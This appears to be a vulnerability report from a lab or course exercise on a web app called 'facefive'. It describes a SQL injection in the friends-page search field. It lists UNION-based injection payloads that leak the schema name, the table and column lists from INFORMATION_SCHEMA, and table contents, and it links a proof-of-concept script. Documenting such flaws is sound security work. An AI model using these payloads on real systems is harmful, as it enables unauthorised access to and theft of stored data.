# Vulnerability 9: SQL Injection in my friends page allows to leak database information

- Vulnerability: SQL Injection
- Where: `search` in my friends page
- Impact: Allows access to all database information with any login

## Steps to reproduce

1. Insert `z' UNION SELECT TABLE_NAME,2,3,4,5 FROM TABLES #` in search field
2. Take note of the name of the schema leaked in the error message
3. Insert `z' UNION SELECT TABLE_NAME,2,3,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'facefivedb' #` in search field to leak list of tables
4. Insert `z' UNION SELECT COLUMN_NAME,2,DATA_TYPE,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table}' #` in search field to leak columns and data types of a table
5. Insert `z' UNION SELECT {column1},2,{column2},{column3},5 FROM {table} #` in search field to leak information in a table

[(POC)](SQLvuln9.py)
